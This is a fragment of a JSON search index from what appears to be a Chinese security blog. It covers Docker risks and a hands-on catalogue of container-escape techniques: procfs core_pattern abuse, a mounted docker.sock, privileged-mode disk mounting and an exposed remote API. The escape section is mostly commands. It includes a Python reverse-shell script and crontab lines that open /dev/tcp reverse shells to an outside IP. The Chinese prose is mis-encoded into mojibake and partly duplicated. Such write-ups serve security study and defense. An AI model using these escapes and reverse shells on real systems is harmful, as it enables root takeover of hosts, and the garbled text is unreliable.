\u0026ndash;pid=hostï¼šä½¿å®¹å™¨ä¸å®¿ä¸»æœºå¤„äºåŒä¸€è¿›ç¨‹å‘½ä»¤ç©ºé—´ï¼Œè¿›ç¨‹éš”ç¦»è¢«æ‰“ç ´ \u0026ndash;volume /:/hostï¼šå®¿ä¸»æœºæ ¹ç›®å½•è¢«æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨ï¼Œæ–‡ä»¶ç³»ç»Ÿéš”ç¦»è¢«æ‰“ç ´ å®¹å™¨ç®¡ç†ç¨‹åºæ¥å£é£é™© Docker å®ˆæŠ¤è¿›ç¨‹ä¸»è¦ç›‘å¬ UNIX socket å’Œ TCP socketï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒDocker åªä¼šç›‘å¬ UNIX socket\nUNIX socket é£é™©ä¸»è¦åœ¨äºDockerå®ˆæŠ¤è¿›ç¨‹é»˜è®¤ä»¥å®¿ä¸»æœºçš„rootæƒé™è¿è¡Œï¼Œè¯´åˆ°è¿™é‡Œå…¶å®ç†Ÿæ‚‰åæ¸—é€çš„å¸ˆå‚…éƒ½èƒ½æƒ³åˆ°ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹è¿›è¡Œææƒï¼Œé™¤æ­¤ä¹‹å¤–æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨è¿™ç‚¹è¿›è¡Œå®¹å™¨é€ƒé€¸ï¼Œè¿™ç±»é£é™©æœ‰ä¸¤ä¸ªåˆ©ç”¨åœºæ™¯\næ™®é€šç”¨æˆ·è¢«åŠ åˆ°Dockerç”¨æˆ·ç»„å†…\nå¦‚æœæ™®é€šç”¨æˆ·è¢«åŠ å…¥åˆ° Docker ç”¨æˆ·ç»„å†…ï¼Œé‚£ä¹ˆæ™®é€šç”¨æˆ·ä¹Ÿå°†æœ‰æƒé™è®¿é—® Docker UNIX socketï¼Œå¦‚æœæ”»å‡»è€…è·å¾—äº†è¿™ä¸ªæ™®é€šç”¨æˆ·æƒé™ï¼Œå°±å¯ä»¥å€ŸåŠ© Docker ææƒåˆ° root ç”¨æˆ·æƒé™\nUnix socketæŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨\næœ‰æ—¶ä¸ºäº†å®ç°å®¹å™¨å†…éƒ¨ç®¡ç†å®¹å™¨ï¼Œå¯èƒ½ä¼šå°† Docker UNIX socket æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨ï¼Œé‚£ä¹ˆå¦‚æœè¯¥å®¹å™¨è¢«å…¥ä¾µï¼Œæ¸—é€æµ‹è¯•äººå‘˜å°±å¯ä»¥å€ŸåŠ©è¿™ä¸ª socket è¿›è¡Œå®¹å™¨é€ƒé€¸è·å¾—å®¿ä¸»æœº root æƒé™\nTCP socket ç°åœ¨ Docker å®ˆæŠ¤è¿›ç¨‹é»˜è®¤ä¸ä¼šç›‘å¬ TCP socketï¼Œä¸è¿‡æœ‰æ—¶å¯èƒ½ç”¨æˆ·ä¼šå› ä¸ºæ–¹ä¾¿å¼€å¯ TCP socket çš„ç›‘å¬ï¼Œä¸€èˆ¬é»˜è®¤ç›‘å¬ç«¯å£æ˜¯ 2375\né»˜è®¤æƒ…å†µä¸‹ï¼ŒDocker å®ˆæŠ¤è¿›ç¨‹ TCP socket æ˜¯æ— åŠ å¯†æ— è®¤è¯çš„ï¼Œå› æ­¤å¦‚æœå‘ç°å®¿ä¸»æœº Docker å¼€æ”¾äº† TCP socketï¼Œå°±å¯ä»¥ç›´æ¥ä½¿ç”¨ docker -H æ¥ç®¡ç›®æ ‡çš„å®¹å™¨\nå…¶ä»–é£é™© å®¹å™¨ç½‘ç»œï¼šå¯èƒ½å­˜åœ¨æ¨ªå‘çš„é£é™© å®¿ä¸»æœºæ“ä½œï¼šå®¹å™¨é€šå¸¸ä¸å®¿ä¸»æœºå…±äº«å†…æ ¸ï¼Œè‹¥å®¿ä¸»æœºå†…æ ¸å­˜åœ¨æ¼æ´é‚£ä¹ˆå®¹å™¨ä¹Ÿå¯èƒ½å­˜åœ¨ç›¸åŒæ¼æ´ï¼Œæ¯”å¦‚åˆ©ç”¨è„ç‰›å®ç°å®¹å™¨é€ƒé€¸ è½¯ä»¶è‡ªèº«ï¼šå³Dockerè‡ªèº«å­˜åœ¨çš„æ¼æ´æ¯”å¦‚CVE-2019-14271ã€CVE-2019-5736 ç­‰å¯ä»¥å¯¼è‡´å®¹å™¨é€ƒé€¸ ",
        "summary": "Dockerå®‰å…¨æ¦‚è§ˆ å‰é¢çš„æ–‡ç« å·²ç»ç®€å•ä»‹ç»äº†dockerå®¹å™¨ç›¸å…³æ¦‚å¿µï¼Œdockerçš„ä½¿ç”¨å¯¹äºæ¥è§¦è¿‡ctfå‡ºé¢˜çš„äººæ¥è¯´è¿˜æ˜¯ç›¸å¯¹ç†Ÿæ‚‰äº†ï¼Œè¿™é‡Œä¹Ÿä¸åšè¿‡å¤šä»‹ç»ï¼Œæ¥ä¸‹æ¥ä»å®‰å…¨çš„è§’åº¦æ¥åˆ†æä¸€ä¸‹docker\nDockeré¢ä¸´çš„é£é™© é•œåƒé£é™© é•œåƒçš„å†…å®¹æ˜¯ç”±ç”¨æˆ·è¿›è¡Œé…ç½®çš„ï¼Œæ‰€ä»¥æœ‰å¯èƒ½é€ æˆä¸€äº›å®‰å…¨é—®é¢˜\nä¸å®‰å…¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶ æ¯”å¦‚åœ¨é•œåƒä¸­å¼•å…¥äº†ä¸€äº›å…·æœ‰ä¸¥é‡ndayçš„ç»„ä»¶ï¼Œæ¯«æ— ç–‘é—®ï¼Œè¿™ä¸ªé•œåƒä¹Ÿå°±å­˜åœ¨æ¼æ´äº†\nä¸å®‰å…¨çš„é•œåƒ ç±»ä¼¼ä¾›åº”é“¾æ”»å‡»ï¼Œåœ¨å…¬å…±é•œåƒä»“åº“æ¯”å¦‚ Docker Hub é‡Œï¼Œä¼šå­˜åœ¨ä¸€äº›æœ‰æ¼æ´çš„é•œåƒæˆ–è€…æ¶æ„é•œåƒï¼Œå¦‚æœä½¿ç”¨äº†è¿™äº›é•œåƒé‚£å°±å­˜åœ¨é£é™©äº†\næ•æ„Ÿä¿¡æ¯æ³„æ¼ å¦‚æœåœ¨é•œåƒå¼€å‘å®Œæ¯•åæ²¡æœ‰åˆ é™¤è‡ªå·±é…ç½®çš„api keyã€AK/SKç­‰ï¼Œé‚£ä¹ˆå¦‚æœåˆ«äººè·å–åˆ°è¯¥é•œåƒå°±å¯èƒ½é€ æˆæ•æ„Ÿä¿¡æ¯æ³„æ¼\næ´»åŠ¨ä¸­çš„å®¹å™¨é£é™© å®¹å™¨åœ¨è¿è¡Œæ—¶ä¹Ÿæœ‰ä¸€äº›èƒ½å¤Ÿç”¨æˆ·è‡ªå®šä¹‰çš„é…ç½®ï¼Œè¿™äº›é…ç½®ä¸å½“åŒæ ·å¯èƒ½é€ æˆé£é™©\nä¸å®‰å…¨çš„å®¹å™¨åº”ç”¨ æ¯”å¦‚æ˜ å°„å‡ºæ¥çš„ç«¯å£çš„æœåŠ¡å­˜åœ¨æ¼æ´ï¼Œé‚£ä¹ˆè‡ªç„¶ä¼šå¯¼è‡´é£é™©\nä¸å—é™åˆ¶çš„èµ„æºå…±äº« å®¹å™¨è¿è¡Œåœ¨å®¿ä¸»æœºä¸Šï¼Œå®¹å™¨å¿…ç„¶è¦ä½¿ç”¨å®¿ä¸»æœºçš„å„ç§ CPUã€å†…å­˜ç­‰èµ„æºï¼Œå¦‚æœæ²¡æœ‰å¯¹å®¹å™¨è¿›è¡Œèµ„æºä½¿ç”¨é™åˆ¶ï¼Œé‚£ä¹ˆå°±å­˜åœ¨å®¿ä¸»æœºè¢«èµ„æºè€—å°½çš„é£é™©\nä¸å®‰å…¨çš„é…ç½®/æŒ‚è½½ æ­£å¸¸æ¥è¯´ï¼Œå®¹å™¨æœ‰ä¸¤å¤§éš”ç¦»æœºåˆ¶ï¼š\nlinuxå‘½åç©ºé—´ï¼šå®ç°æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œã€è¿›ç¨‹ã€ä¸»æœºåç­‰æ–¹é¢çš„éš”ç¦» linuxæ§åˆ¶ç»„ï¼šå®ç°CPUã€å†…å­˜ã€ç¡¬ç›˜ç­‰æ–¹é¢çš„éš”ç¦» è€Œé…ç½®ä¸å½“ä¼šå¯¼è‡´å®¹å™¨æœ¬èº«éš”ç¦»æœºåˆ¶å¤±æ•ˆï¼š\n\u0026ndash;privilegedï¼šä½¿å®¹å™¨å†…çš„ root æƒé™å’Œå®¿ä¸»æœºä¸Šçš„ root æƒé™ä¸€è‡´ï¼Œæƒé™éš”ç¦»è¢«æ‰“ç ´ \u0026ndash;net=hostï¼šä½¿å®¹å™¨ä¸å®¿ä¸»æœºå¤„äºåŒä¸€ç½‘ç»œå‘½åç©ºé—´ï¼Œç½‘ç»œéš”ç¦»è¢«æ‰“ç ´ \u0026ndash;pid=hostï¼šä½¿å®¹å™¨ä¸å®¿ä¸»æœºå¤„äºåŒä¸€è¿›ç¨‹å‘½ä»¤ç©ºé—´ï¼Œè¿›ç¨‹éš”ç¦»è¢«æ‰“ç ´ \u0026ndash;volume /:/hostï¼šå®¿ä¸»æœºæ ¹ç›®å½•è¢«æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨ï¼Œæ–‡ä»¶ç³»ç»Ÿéš”ç¦»è¢«æ‰“ç ´ å®¹å™¨ç®¡ç†ç¨‹åºæ¥å£é£é™© Docker å®ˆæŠ¤è¿›ç¨‹ä¸»è¦ç›‘å¬ UNIX socket å’Œ TCP socketï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒDocker åªä¼šç›‘å¬ UNIX socket\nUNIX socket é£é™©ä¸»è¦åœ¨äºDockerå®ˆæŠ¤è¿›ç¨‹é»˜è®¤ä»¥å®¿ä¸»æœºçš„rootæƒé™è¿è¡Œï¼Œè¯´åˆ°è¿™é‡Œå…¶å®ç†Ÿæ‚‰åæ¸—é€çš„å¸ˆå‚…éƒ½èƒ½æƒ³åˆ°ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹è¿›è¡Œææƒï¼Œé™¤æ­¤ä¹‹å¤–æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨è¿™ç‚¹è¿›è¡Œå®¹å™¨é€ƒé€¸ï¼Œè¿™ç±»é£é™©æœ‰ä¸¤ä¸ªåˆ©ç”¨åœºæ™¯\næ™®é€šç”¨æˆ·è¢«åŠ åˆ°Dockerç”¨æˆ·ç»„å†…\nå¦‚æœæ™®é€šç”¨æˆ·è¢«åŠ å…¥åˆ° Docker ç”¨æˆ·ç»„å†…ï¼Œé‚£ä¹ˆæ™®é€šç”¨æˆ·ä¹Ÿå°†æœ‰æƒé™è®¿é—® Docker UNIX socketï¼Œå¦‚æœæ”»å‡»è€…è·å¾—äº†è¿™ä¸ªæ™®é€šç”¨æˆ·æƒé™ï¼Œå°±å¯ä»¥å€ŸåŠ© Docker ææƒåˆ° root ç”¨æˆ·æƒé™\nUnix socketæŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨\næœ‰æ—¶ä¸ºäº†å®ç°å®¹å™¨å†…éƒ¨ç®¡ç†å®¹å™¨ï¼Œå¯èƒ½ä¼šå°† Docker UNIX socket æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨ï¼Œé‚£ä¹ˆå¦‚æœè¯¥å®¹å™¨è¢«å…¥ä¾µï¼Œæ¸—é€æµ‹è¯•äººå‘˜å°±å¯ä»¥å€ŸåŠ©è¿™ä¸ª socket è¿›è¡Œå®¹å™¨é€ƒé€¸è·å¾—å®¿ä¸»æœº root æƒé™\n"
    }
,
    {
        "title": "Dockeré€ƒé€¸æ‰‹æ³•å¤§å…¨",
        "link": "/My-Knowlege-Database/blog/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E9%80%83%E9%80%B8%E6%89%8B%E6%B3%95%E5%A4%A7%E5%85%A8/",
        "content": "Dockeré€ƒé€¸æ‰‹æ³•å¤§å…¨ Dockerç›¸å…³å®‰å…¨é£é™©æ›´å¤šé›†ä¸­åœ¨Dockeré€ƒé€¸æ–¹é¢\nå’ŒåŸºç¡€çš„åæ¸—é€æ€è·¯ä¸€æ ·ï¼Œåœ¨è·å–dockerçš„æƒé™åéœ€è¦å¯¹dockerè¿›è¡Œä¿¡æ¯æœé›†ï¼Œåˆ¤æ–­æ˜¯å¦å…·æœ‰æ»¡è¶³dockeré€ƒé€¸çš„æ¡ä»¶\nåˆ¤æ–­æ˜¯å¦ä¸ºå®¹å™¨ç¯å¢ƒ åœ¨ä¹‹å‰çš„æ–‡ç« ä¸­ä¹Ÿæåˆ°è¿‡ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹cgroupä¿¡æ¯ç­‰æ–¹æ³•æ¥åˆ¤æ–­ï¼Œå¯ä»¥å‚è€ƒæˆ‘çš„è¿™ç¯‡ç¬”è®°ï¼šå¿«é€Ÿè¯†åˆ«è™šæ‹Ÿä¸»æœºã€Dockerå’ŒK8sé›†ç¾¤ç¯å¢ƒ\nä¸è¿‡æŸ¥çœ‹cgroupç›®å½•çš„æ–¹æ³•ä¼¼ä¹åªå¯¹cgroup v1æœ‰ç”¨ï¼Œæ‰€ä»¥æ¨èä½¿ç”¨æŸ¥çœ‹æ ¹ç›®å½•.dockerenvçš„åŠæ³•ï¼š\nls -al /.dockerenv ç¡®è®¤ä¸ºå®¹å™¨ç¯å¢ƒä¹‹åï¼Œå°±å¯ä»¥æŸ¥çœ‹æ˜¯å¦å…·æœ‰æ»¡è¶³é€ƒé€¸çš„æ¡ä»¶äº†ï¼Œæ¥ä¸‹æ¥ä»åŸºç¡€æ¦‚å¿µã€ç¯å¢ƒæ­å»ºã€ä¿¡æ¯æœé›†ã€æ¼æ´åˆ©ç”¨ç­‰æ–¹é¢è®°å½•ä¸€ä¸‹dockeré€ƒé€¸çš„ä¸€äº›tricksï¼Œå½“ç„¶å¦‚æœæ¯”è¾ƒæ‡’ï¼Œä¹Ÿå¯ä»¥è¯•è¯•å¼€æºçš„è‡ªåŠ¨æ£€æµ‹è„šæœ¬ï¼šé¡¹ç›®åœ°å€ï¼šhttps://github.com/teamssix/container-escape-check\næŒ‚è½½å®¿ä¸»æœºprocfsé€ƒé€¸ åŸºç¡€æ¦‚å¿µ procfsï¼ˆ/procï¼‰æ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œåæ˜ äº†ç³»ç»Ÿå†…è¿›ç¨‹ä»¥åŠå…¶ä»–ç»„ä»¶çš„çŠ¶æ€ï¼Œå…¶ä¸­æœ‰å¾ˆå¤šæ•æ„Ÿæ–‡ä»¶\nuser namespaceæ˜¯linuxçš„ä¸€é¡¹å®‰å…¨åŠŸèƒ½ï¼Œå…è®¸åœ¨å®¹å™¨ä¸­æ˜ å°„å’Œéš”ç¦»ç”¨æˆ·ID\nè€Œåœ¨å®¹å™¨å†…é»˜è®¤å¯ç”¨rootæƒé™ï¼Œä¸”é»˜è®¤æ²¡æœ‰å¼€å¯User Namespaceæ—¶ï¼Œå®¹å™¨ä¸­çš„rootç”¨æˆ·ä¸å®¿ä¸»æœºçš„rootç”¨æˆ·UIDä¼šä¸€è‡´ï¼ˆå‡ä¸º0ï¼‰ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœå°†procfsæŒ‚è½½åˆ°ä¸å—æ§çš„å®¹å™¨ä¸­ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´å®¹å™¨é€ƒé€¸ï¼Œè¿™é‡Œè¿ç”¨åˆ°ä¸€ä¸ªtricksï¼š\nä» 2.6.19 å†…æ ¸ç‰ˆæœ¬å¼€å§‹ï¼ŒLinux æ”¯æŒåœ¨ /proc/sys/kernel/core_pattern ä¸­ä½¿ç”¨æ–°è¯­æ³•ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„é¦–ä¸ªå­—ç¬¦æ˜¯ç®¡é“ç¬¦ | ï¼Œé‚£ä¹ˆè¯¥è¡Œçš„å‰©ä½™å†…å®¹å°†è¢«å½“ä½œç”¨æˆ·ç©ºé—´ç¨‹åºæˆ–è„šæœ¬è§£é‡Šå¹¶æ‰§è¡Œ\nç¯å¢ƒæ­å»º åˆ›å»ºå®¹å™¨å¹¶æŒ‚è½½/procç›®å½•ï¼š\ndocker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu æ­å»ºå®Œæ¯•\nä¿¡æ¯æœé›† å¦‚æœå‘ç°äº†ä¸¤ä¸ªcore_patternæ–‡ä»¶ï¼Œåˆ™å¯èƒ½å°±æ˜¯æŒ‚è½½äº†å®¿ä¸»æœºçš„procfsï¼š\nfind / -name core_pattern æ¼æ´åˆ©ç”¨ æ‰¾åˆ°å½“å‰å®¹å™¨åœ¨ä¸»æœºä¸‹çš„ç»å¯¹è·¯å¾„ï¼š\ncat /proc/mounts | xargs -d \u0026#39;,\u0026#39; -n 1 | grep workdir å¯ä»¥çœ‹åˆ°ç»å¯¹è·¯å¾„ä¸º/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/work\næ¥ä¸‹æ¥å®‰è£…vimå’Œgccï¼š\napt-get update -y \u0026amp;\u0026amp; apt-get install vim gcc -y ç„¶ååˆ›å»ºä¸€ä¸ªpythonè„šæœ¬ç”¨äºåå¼¹shellï¼š\n#!/usr/bin/python3 import os import pty import socket lhost = \u0026#34;xx.xx.xx.xx\u0026#34; lport = 7777 def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(\u0026#34;HISTFILE\u0026#34;, \u0026#39;/dev/null\u0026#39;) pty.spawn(\u0026#34;/bin/bash\u0026#34;) # os.remove(\u0026#39;/tmp/.shell.py\u0026#39;) s.close() if __name__ == \u0026#34;__main__\u0026#34;: main() èµ‹äºˆæ‰§è¡Œæƒé™ï¼š\nchmod 777 .shell.py å°†è„šæœ¬å†™å…¥åˆ°ç›®æ ‡çš„procç›®å½•ä¸‹ï¼š\necho -e \u0026#34;|/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/merged/tmp/.shell.py \\rcore \u0026#34; \u0026gt; /host/proc/sys/kernel/core_pattern åœ¨æ”»å‡»æœºä¸Šå¼€å¯ç›‘å¬ï¼Œæ¥ä¸‹æ¥åªéœ€è¦è®©å®¹å™¨å´©æºƒé‡å¯å³å¯æ‰§è¡Œåå¼¹shellè„šæœ¬ï¼Œä½¿ç”¨ç¨‹åºå®ç°ï¼š\n#include\u0026lt;stdio.h\u0026gt; int main(void) { int *a = NULL; *a = 1; return 0; } gccç¼–è¯‘ï¼š\ngcc .crash.c -o .crash æ‰§è¡Œç¼–è¯‘åçš„ç¨‹åºä½¿dockerå´©æºƒè§¦å‘core dumpï¼Œæ­¤æ—¶å®¿ä¸»æœº/proc/sys/kernel/core_pattern ä¸­å†™å…¥çš„.shell.pyä¼šè¢«æ‰§è¡Œ\næˆåŠŸç›‘å¬åˆ°å®¿ä¸»æœºçš„åå¼¹shellï¼š\nè‡³æ­¤ï¼Œæˆ‘ä»¬å®Œæˆäº†ä¸€æ¬¡æŒ‚è½½å®¿ä¸»æœºprocfsé€ƒé€¸\næŒ‚è½½docker socketé€ƒé€¸ åŸºç¡€æ¦‚å¿µ Docker Socket (/var/run/docker.sock) æ˜¯ Docker å®ˆæŠ¤è¿›ç¨‹ï¼ˆdockerdï¼‰ ä¸ å®¢æˆ·ç«¯ï¼ˆå¦‚ docker CLIã€Docker API è°ƒç”¨ï¼‰ ä¹‹é—´çš„ä¸»è¦é€šä¿¡æ¥å£ï¼Œå³ç”¨æ¥ä¸å®ˆæŠ¤è¿›ç¨‹é€šä¿¡å³æŸ¥è¯¢ä¿¡æ¯æˆ–è€…ä¸‹å‘å‘½ä»¤\nè‹¥å®¹å™¨æŒ‚è½½äº†/var/run/docker.sockï¼Œå°±ç›¸å½“äºè·å¾—äº† Docker CLIï¼ˆå‘½ä»¤è¡Œæ¥å£ï¼‰çš„å®Œå…¨è®¿é—®æƒé™ï¼Œé€šè¿‡ Docker APIï¼Œå¯ä»¥åœ¨å®¹å™¨å†…éƒ¨ç›´æ¥ç®¡ç†å®¿ä¸»æœºä¸Šçš„ Docker è¿›ç¨‹ï¼Œæœ€ç»ˆå¯¼è‡´å®¹å™¨é€ƒé€¸\nç¯å¢ƒæ­å»º åˆ›å»ºå®¹å™¨å¹¶æŒ‚è½½/var/run/docker.sockæ–‡ä»¶ï¼š\ndocker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu è¿›å…¥å®¹å™¨å¹¶å®‰è£…dockerå‘½ä»¤è¡Œå®¢æˆ·ç«¯ï¼š\ndocker exec -it with_docker_sock /bin/bash apt-get update apt-get install curl #å®˜ç½‘ curl -fsSL https://get.docker.com/ | sh #é˜¿é‡Œäº‘é•œåƒ curl -fsSL https://get.docker.com -o install-docker.sh sh install-docker.sh --mirror Aliyun è‡³æ­¤ï¼Œç¯å¢ƒæ­å»ºå®Œæ¯•\nä¿¡æ¯æœé›† ç›´æ¥æ£€æŸ¥æ˜¯å¦å­˜åœ¨/var/run/docker.sockæ–‡ä»¶ï¼š\nls -lah /var/run/docker.sock è‹¥æ–‡ä»¶å­˜åœ¨ï¼Œåˆ™å¯èƒ½å­˜åœ¨è¯¥æ¼æ´\næ¼æ´åˆ©ç”¨ åœ¨å®¹å™¨å†…éƒ¨åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨ï¼Œå¹¶å°†å®¿ä¸»æœºç›®å½•æŒ‚è½½åˆ°æ–°çš„å®¹å™¨å†…éƒ¨ï¼š\ndocker run -it -v /:/host ubuntu /bin/bash æ­¤æ—¶æˆ‘ä»¬å¯ä»¥å‘ç°/hostç›®å½•å°±æ˜¯å®¿ä¸»æœºçš„æ ¹ç›®å½•ï¼š\né‚£ä¹ˆåªéœ€è¦chrootå°†å…¶å˜ä¸ºæ ¹ç›®å½•ä¸€ä¸‹å°±å®Œæˆäº†é€ƒé€¸ï¼š\nchroot /host privilegedç‰¹æƒæ¨¡å¼é€ƒé€¸ åŸºç¡€çŸ¥è¯† å½“ Docker å®¹å™¨ä»¥ --privileged å¯åŠ¨æ—¶ï¼Œä¼šè·å¾—ä»¥ä¸‹æƒé™ï¼š\nå®Œå…¨è®¾å¤‡è®¿é—®æƒé™ï¼šå¯è®¿é—®å®¿ä¸»æœºæ‰€æœ‰è®¾å¤‡ï¼ˆå¦‚ /dev/sdaæˆ–vdaã€/dev/tty ç­‰ï¼‰ã€‚ ç»•è¿‡ Linux Capabilities é™åˆ¶ï¼šé»˜è®¤å®¹å™¨ä»…ä¿ç•™éƒ¨åˆ†æƒé™ï¼ˆå¦‚ CAP_CHOWNã€CAP_NET_BIND_SERVICEï¼‰ï¼Œç‰¹æƒæ¨¡å¼èµ‹äºˆå®¹å™¨ æ‰€æœ‰ Capabilitiesï¼ˆåŒ…æ‹¬ CAP_SYS_ADMINï¼‰ã€‚ ç¦ç”¨å®‰å…¨éš”ç¦»æœºåˆ¶ï¼šåŒ…æ‹¬ Seccompã€AppArmor/SELinux çš„éƒ¨åˆ†é™åˆ¶ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°±æœ‰å¯èƒ½å°†å®¿ä¸»æœºæ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨é€ æˆé€ƒé€¸\nç¯å¢ƒæ­å»º é¦–å…ˆæœ‰ä¸€ä¸ªæ™®é€šç”¨æˆ· yuy0ung å¹¶ä¸”åŠ å…¥äº† docker ç»„ï¼š\nsudo useradd -m -s /bin/bash yuy0ung sudo passwd yuy0ung sudo usermod -aG docker yuy0ung su - yuy0ung åœ¨æ™®é€šç”¨æˆ·ä¸‹ä½¿ç”¨--privileged=trueåˆ›å»ºä¸€ä¸ªå®¹å™¨\ndocker run --rm --privileged=true -it alpine è‡³æ­¤ç¯å¢ƒæ­å»ºå®Œæ¯•\nä¿¡æ¯æœé›† åˆ¤æ–­æ˜¯å¦ä¸ºç‰¹æƒæ¨¡å¼ï¼š\ncat /proc/self/status | grep CapEff å¦‚æœdockeræ˜¯ä»¥ç‰¹æƒæ¨¡å¼å¯åŠ¨çš„è¯ï¼ŒCapEff å¯¹åº”çš„æ©ç å€¼åº”è¯¥ä¸º0000003fffffffff æˆ–è€…æ˜¯ 0000001fffffffff:\nå¯è§å®¹å™¨ç¡®å®æ˜¯ç‰¹æƒæ¨¡å¼å¯åŠ¨\næ¼æ´åˆ©ç”¨ æ–¹æ³•1 æŸ¥çœ‹ç£ç›˜æŒ‚è½½è®¾å¤‡ï¼š\nfdisk -l å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª39.8Gçš„ç£ç›˜/dev/vda3ï¼Œè¿™å°±æ˜¯å®¿ä¸»æœºæ–‡ä»¶ï¼Œå°†å…¶æŒ‚è½½åˆ°/testç›®å½•:\nmkdir /test \u0026amp;\u0026amp; mount /dev/vda3 /test æ­¤æ—¶å·²ç»æˆåŠŸæŒ‚è½½å®¿ä¸»æœºæ ¹ç›®å½•ï¼š å¯ä»¥å°è¯•è¯»å–ä»»æ„æ–‡ä»¶ï¼š æˆ‘ä»¬è¿˜å¯ä»¥å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹shellï¼š\necho \u0026#39;* * * * * root /bin/bash -c \u0026#34;sh -i \u0026gt;\u0026amp; /dev/tcp/47.94.106.5/7777 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; \u0026gt;\u0026gt; /test/etc/crontab æˆåŠŸç›‘å¬åˆ°å®¿ä¸»æœºrootæƒé™çš„åå¼¹shellï¼š\nè‡³æ­¤ï¼ŒæˆåŠŸé€ƒé€¸\næ–¹æ³•2 å’Œå‰é¢æåˆ°çš„æ–¹æ³•ç±»ä¼¼ï¼Œç”±äºæˆ‘ä»¬å°†å®¿ä¸»æœºæ ¹ç›®å½•æŒ‚è½½åˆ°äº†/testï¼Œè€Œæˆ‘ä»¬çš„shellæœ¬èº«æƒé™åˆæ˜¯rootï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç›´æ¥chrootå°†/testæ”¹ä¸ºæ ¹ç›®å½•ï¼š\nchroot /test å½“ç„¶åˆ°è¿™ä¸€æ­¥æˆ‘ä»¬çš„æ–¹æ³•ä¸ä»…ä»…æ‹˜æ³¥äºæˆ‘æåˆ°çš„ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯é«˜æƒé™ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥å°è¯•åœ¨ç›´æ¥å»æ·»åŠ æ–°çš„rootç»„ç”¨æˆ·å¹¶ç™»å½•ç­‰æ“ä½œ\ndockerè¿œç¨‹APIæœªæˆæƒè®¿é—®é€ƒé€¸ åŸºç¡€çŸ¥è¯† docker remote api å¯ä»¥æ‰§è¡Œ docker å‘½ä»¤ï¼Œè‹¥é…ç½®é”™è¯¯å°†å…¶æš´éœ²åœ¨å…¬ç½‘ï¼Œæ”»å‡»è€…å¯é€šè¿‡è¿œç¨‹è°ƒç”¨ Docker APIç›´æ¥ç®¡ç†å®¹å™¨ï¼Œè¿›è€Œå¯¼è‡´é€ƒé€¸getshell\nç¯å¢ƒæ­å»º å°†dockerå®ˆæŠ¤è¿›ç¨‹ç›‘å¬åœ¨0.0.0.0ï¼š\ndockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375 å¦‚æœæœ‰é˜²ç«å¢™è®°å¾—å¼€æ”¾2375ç«¯å£\nä¿¡æ¯æœé›† ç›´æ¥è®¿é—®æœåŠ¡å™¨2375ç«¯å£ï¼š\nå¦‚æœå“åº”ä¸ºä¸Šå›¾è¿™æ ·æ—¢è¡¨æ˜å­˜åœ¨æ¼æ´\nä¹Ÿå¯ä»¥ä½¿ç”¨æˆ‘ä»¬çš„dockerå°è¯•è¿œç¨‹è°ƒç”¨è¯¥ç«¯å£apiï¼š\ndocker -H tcp://x.x.x.x:2375 images å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸè°ƒç”¨è¯¥apiå¹¶åˆ—å‡ºäº†è¯¥dockerçš„é•œåƒï¼Œå³æ¼æ´å­˜åœ¨\næ¼æ´åˆ©ç”¨ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ç›¸å½“äºå¯ä»¥ä»»æ„æ§åˆ¶ç›®æ ‡æœåŠ¡å™¨çš„dockeräº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ–°è¿è¡Œä¸€ä¸ªå®¹å™¨ï¼ŒæŒ‚è½½ç‚¹è®¾ç½®ä¸ºæœåŠ¡å™¨çš„æ ¹ç›®å½•æŒ‚è½½è‡³/yuy0ungç›®å½•ä¸‹\ndocker -H tcp://xx.xx.xx.xx:2375 run -it -v /:/yuy0ung nginx:latest /bin/bash é‚£ä¹ˆæ¥ä¸‹æ¥çš„æ€è·¯å°±å’Œä¸Šé¢å·®ä¸å¤šäº†ï¼Œchrootæˆ–è€…å†™ä¸€ä¸ªå®šæ—¶ä»»åŠ¡å³å¯å®ç°é€ƒé€¸ï¼š\nchroot:\nå®šæ—¶ä»»åŠ¡ç›‘å¬ï¼š\necho \u0026#39;* * * * * root /bin/bash -c \u0026#34;sh -i \u0026gt;\u0026amp; 